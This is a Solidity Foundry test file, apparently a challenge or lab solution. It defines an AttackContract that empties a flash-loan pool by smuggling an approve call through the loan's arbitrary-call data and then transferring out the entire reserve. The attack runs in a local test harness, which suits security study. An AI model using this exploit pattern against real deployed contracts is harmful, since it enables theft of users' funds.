// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackContract {
    address owner;
    IERC20 underlyingToken;
    Pool target;

    constructor(IERC20 token, address pool) {
        owner = msg.sender;
        underlyingToken = token;

        target = Pool(pool);
    }

    function attack(uint256 amount) external {
        require(msg.sender == owner);

        // uint256 amount, address borrower, address target, bytes calldata data
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        target.requestFlashLoan(0, address(this), address(underlyingToken), data);

        underlyingToken.transferFrom(address(target), owner, amount);
    }
}

contract FlashLoanAttack1 is Test {
    Token token;
    Pool pool;

    address deployer;
    address attacker;

    uint256 reserve = 100_000_000 * 10e18;

    function setUp() public {
        deployer = address(111);
        attacker = address(777);

        vm.startPrank(deployer);
        token = new Token();
        pool = new Pool(address(token));
        token.transfer(address(pool), reserve);
        vm.stopPrank();

        assertEq(reserve, token.balanceOf(address(pool)));
        assertEq(0, token.balanceOf(attacker));

    }

    function test_Attack() public {
        vm.startPrank(attacker);
        AttackContract attackContract = new AttackContract(token, address(pool));
        attackContract.attack(reserve);
        vm.stopPrank();

        assertEq(reserve, token.balanceOf(attacker));
        assertEq(0, token.balanceOf(address(pool)));
    }
}